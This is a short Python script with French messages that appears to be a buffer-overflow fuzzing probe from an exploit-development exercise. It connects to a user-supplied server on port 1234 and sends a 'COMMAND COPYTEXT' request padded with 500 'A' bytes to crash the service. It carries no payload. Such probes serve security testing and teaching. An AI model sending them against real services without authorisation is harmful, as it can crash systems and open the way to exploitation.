#!/usr/bin/python
import socket
import sys

try:
    server = sys.argv[1]
    port = 1234
    size = 500

    inputBuffer = b"A"*size

    command = b"COMMAND COPYTEXT "
    command+= inputBuffer
    command+= b"\r\n"

    print("Envoi du buffer")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(command)
    s.close()
  
    print("Fait !")
  
except socket.error:
    print("Erreur lors de la connexion")
